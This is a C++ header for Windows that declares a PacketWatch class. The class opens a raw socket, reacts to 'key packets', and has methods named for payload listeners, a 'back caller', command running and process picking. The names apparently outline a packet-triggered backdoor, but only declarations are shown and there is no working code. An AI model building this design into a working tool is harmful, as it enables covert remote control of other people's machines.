#pragma once

#include "stdafx.h"


//Class to open a raw socket and respond to key packets in cool ways

class PacketWatch {
private:
	HANDLE mythread; 
	char buffer[2048];
	BOOL master;
public:
	PacketWatch();
	~PacketWatch();
	void start();
	DWORD WINAPI mymain(LPVOID lpParam);
	void action_1();
	void action_2();
	void OpenTCPPayloadListener();
	void OpenUDPPayloadListener();
	void SetUpBackCaller(char *buffer);
	void RunCommand();
	void spinclient();
	int pickprocess();
};